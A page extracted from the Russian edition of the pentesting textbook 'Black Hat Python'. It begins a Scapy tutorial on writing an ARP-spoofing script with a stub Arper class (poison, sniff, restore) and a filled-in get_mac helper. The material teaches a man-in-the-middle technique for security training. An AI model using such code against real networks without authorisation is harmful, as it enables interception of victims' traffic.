# Black Hat Python. Программирование для хакеров и пентестеров — страница 81

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

ARP-спуфинг с использованием Scapy   81
приступить к написанию скрипта для ARP-спуфинга. Создайте файл с именем
arper.py и сохраните в нем приведенный далее код. Для начала сформируем
каркас, чтобы вы получили представление о том, из чего состоит этот скрипт:
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time
def get_mac(targetip): 
    pass
class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        pass
    def run(self):
        pass
   def poison(self): 
        pass
   def sniff(self, count=200): 
        pass
   def restore(self): 
        pass
if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
Определим вспомогательную функцию для получения MAC-адреса любо -
го заданного компьютера , а также класс Arper для подмены ( poison) ,
извлечения (sniff)  и восстановления (restore)  сетевых параметров.
Наполним кодом каждый участок, начиная с функции get_mac, которая воз-
вращает MAC-адрес для заданного IP-адреса. Нас интересуют MAC-адреса
жертвы и шлюза.
def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip) 
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False) 
    for _, r in resp:
        return r[Ether].src
    return None
